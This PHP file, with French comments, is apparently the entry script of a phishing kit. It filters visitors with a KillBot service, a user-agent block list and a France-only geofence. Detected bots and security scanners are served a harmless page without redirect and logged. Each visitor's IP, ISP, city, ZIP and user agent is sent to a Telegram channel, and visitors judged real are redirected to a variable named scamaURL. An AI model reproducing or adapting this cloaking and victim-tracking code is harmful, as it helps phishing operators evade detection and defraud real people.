<?php
require_once 'config.php'; // <== Le fichier config précédent

$visitorIp   = $Killbot->get_client_ip();
$userAgent   = $_SERVER['HTTP_USER_AGENT'] ?? '';
$referrer    = $_SERVER['HTTP_REFERER'] ?? '';
// URL actuelle de la page index.php
$currentUrl  = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http")
              . "://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";

// 1) Récupère la liste d'IP déjà bloquées
$botsIpsFile = __DIR__ . '/bots_ips.txt';
$blockedIps  = [];
if (file_exists($botsIpsFile)) {
    $blockedIps = file($botsIpsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
}

// 2) Vérifie si l’IP est déjà bloquée => si oui => pas de redirection, on sert home/index.html
if (in_array($visitorIp, $blockedIps)) {
    // On affiche directement le contenu de home/index.html avec un code 200
    // Le bot ne voit donc PAS de redirection HTTP
    if (file_exists(__DIR__ . '/home/index.php')) {
        readfile(__DIR__ . '/home/index.php');
    } else {
        echo "<h1>Page indisponible</h1>";
    }
    exit;
}

// 3) Vérifie si User-Agent est dans `blocked.txt` (ou si killbot = block, ou pays != FR)
$blockedUAFile = __DIR__ . '/blocked.txt';
$check         = $Killbot->check();

// On récupère les infos de géolocalisation renvoyées par KillBot
$IPLocation  = $check["IPlocation"] ?? [];
$countryCode = $IPLocation['countryCode'] ?? '??';

// Récupération détaillée (si l'API KillBot les fournit)
$ISP  = $IPLocation['isp']  ?? '';
$type = $IPLocation['type'] ?? ''; // Type de connexion (ex: Cable/DSL)
$zip  = $IPLocation['zip']  ?? '';
$city = $IPLocation['city'] ?? '';

// -- Test de UA
function isBotUserAgent($ua, $blockedUAFile) {
    if (!file_exists($blockedUAFile)) {
        return false;
    }
    $blockedUAs = file($blockedUAFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($blockedUAs as $uaLine) {
        $uaLineTrim = trim($uaLine);
        // Repère les lignes commençant par "#>" dans blocked.txt
        if (strpos($uaLineTrim, '#>') === 0) {
            // Retire "#>"
            $uaLineTrim = preg_replace('/^#>\s*/', '', $uaLineTrim);
            // Retire "[ Bot ]" éventuel en fin
            $uaLineTrim = preg_replace('/\s*\[ Bot \]\s*$/', '', $uaLineTrim);
            $uaLineTrim = trim($uaLineTrim);

            // Vérifie si cette sous-chaîne apparaît dans le user-agent du visiteur
            if ($uaLineTrim !== '' && stripos($ua, $uaLineTrim) !== false) {
                return true; // Bot détecté
            }
        }
    }
    return false;
}

$isBotByUA       = isBotUserAgent($userAgent, $blockedUAFile);
$isBotByKillBot  = isset($check["block"]) && $check["block"] === true;
$isNotFromFrance = ($countryCode !== 'FR'); // pays != FR => block

// 4) Si on détecte un bot => on l’ajoute dans bots_ips.txt, on envoie message Telegram + le fichier .txt, on "bloque"
if ($isBotByUA || $isBotByKillBot || $isNotFromFrance) {
    // Ajoute l’IP dans bots_ips.txt
    file_put_contents($botsIpsFile, $visitorIp . PHP_EOL, FILE_APPEND | LOCK_EX);

    // Construit le message
    $message  = "❌<u>Nouveau BOT</u>❌\n";
    if ($isBotByUA) {
        $message .= "Détection : blocked.txt (UA)\n";
    } elseif ($isBotByKillBot) {
        $message .= "Détection : KillBot (type: " . ($check['type'] ?? '???') . ")\n";
    } elseif ($isNotFromFrance) {
        $message .= "Détection : Pays != FR ($countryCode)\n";
    }

    // Ajout des infos demandées
    $message .= "\n<b>IP:</b> $visitorIp";
    if (!empty($ISP)) {
        $message .= "\n<b>ISP:</b> $ISP";
    }
    // Emoji du pays + nom
    $paysEmoji = $emoji_flags[$countryCode] ?? '';
    $paysNom   = $IPLocation['country'] ?? '';
    $message .= "\n<b>Pays:</b> $paysEmoji $paysNom";
    if (!empty($type)) {
        $message .= "\n<b>Type de connexion:</b> $type";
    }
    if (!empty($zip)) {
        $message .= "\n<b>ZIP:</b> $zip";
    }
    if (!empty($city)) {
        $message .= "\n<b>City:</b> $city";
    }
    $message .= "\n<b>User-Agent:</b> $userAgent";

    if (!empty($referrer)) {
        $message .= "\n<b>Referrer:</b> $referrer";
    }
    $message .= "\n<b>URL Courante:</b> $currentUrl";

    // Envoi du message texte sur Telegram
    $telegram->sendMessage($message);

    // Envoi du fichier bots_ips.txt mis à jour
    $telegram->sendDocument($botsIpsFile, "Liste des bots mise à jour");

    // Pour le bot, on renvoie le contenu de home/index.html (ou un message minimal)
    // => code HTTP 200 => pas de redirection
    if (file_exists(__DIR__ . '/home/index.html')) {
        readfile(__DIR__ . '/home/index.html');
    } else {
        echo "<h1>Page indisponible</h1>";
    }
    exit;
}

// 5) Sinon => visiteur légitime => on envoie un message Telegram à CHAQUE visite
$message  = "🟢<u>Visiteur Légitime</u>🟢\n";
$message .= "<b>IP:</b> $visitorIp";
if (!empty($ISP)) {
    $message .= "\n<b>ISP:</b> $ISP";
}
$paysEmoji = $emoji_flags[$countryCode] ?? '';
$paysNom   = $IPLocation['country'] ?? '';
$message .= "\n<b>Pays:</b> $paysEmoji $paysNom";
if (!empty($type)) {
    $message .= "\n<b>Type de connexion:</b> $type";
}
if (!empty($zip)) {
    $message .= "\n<b>ZIP:</b> $zip";
}
if (!empty($city)) {
    $message .= "\n<b>City:</b> $city";
}
$message .= "\n<b>User-Agent:</b> $userAgent";

if (!empty($referrer)) {
    $message .= "\n<b>Referrer:</b> $referrer";
}
$message .= "\n<b>URL Courante:</b> $currentUrl";

// Envoi Telegram
$telegram->sendMessage($message);

// 6) Redirection vers scamaURL (comme avant) => 3xx
header('Location: ' . $scamaURL);
exit;
